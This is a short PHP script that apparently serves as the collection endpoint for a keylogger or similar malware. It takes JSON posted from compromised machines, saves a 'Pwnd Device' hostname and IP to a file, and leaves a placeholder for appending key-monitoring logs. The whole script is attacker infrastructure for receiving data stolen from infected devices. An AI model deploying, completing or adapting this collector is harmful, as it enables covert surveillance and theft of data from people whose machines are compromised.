<?php
//log incoming POST data to file
$raw_data = file_get_contents("php://input");
$data = json_decode($raw_data, true);

//identify if system info or key monitoring
if (isset($data['type']) && $data['type'] === 'system_info') {
    
    //save seperate header
    $header_content = "Pwnd Device Hostname: " . $data['hostname'] . " | IP: " . $data['ip'];
    file_put_contents("device_info.txt", $header_content);
} else {
    //append the standard log data
    // (Add your log appending logic here if needed)
}

echo "Success: Data Recieved by PHP.";
?>